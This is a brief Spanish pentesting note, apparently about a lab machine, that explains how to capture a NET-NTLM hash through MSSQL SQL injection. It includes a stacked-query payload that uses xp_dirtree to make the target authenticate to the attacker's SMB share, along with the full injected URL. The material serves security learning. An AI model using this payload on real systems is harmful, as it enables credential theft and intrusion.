Si estamos ante un servidor Windows en el que vemos un potencial ataque SQL Injection, mediante el uso de xp_dirtree vamos a lograr un intento de autenticación a nuestro servidor smb local en el que podremos obtener el hash NET-NTLM del usuario y poder crackearlo por fuerza bruta.

Como en MSSQL podemos stackear queries, vamos a hacer una consulta a cualquier pagina con su identificador, y mediante el uso de los dos puntos, vamos a concatenar `EXEC master..xp_dirtree '\\10.10.14.21\smbserver\'`.
Tenemos que poner nuestra IP Local y el recurso que estamos compartiendo de manera simultanea.

Esto dentro de una SQL Injection quedaría de tal manera: `https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=36;%20EXEC%20master..xp_dirtree%20%27\\10.10.14.21\smbserver\%27;%20--`

Por el otro lado, en local, vamos a recibir una autenticación y vamos a tener un hash a crackear por fuerza bruta:

![image](https://github.com/SrMeirins/KnowledgeVault/assets/95763783/0acd2c41-e9ad-4827-81fb-1daec656de94)
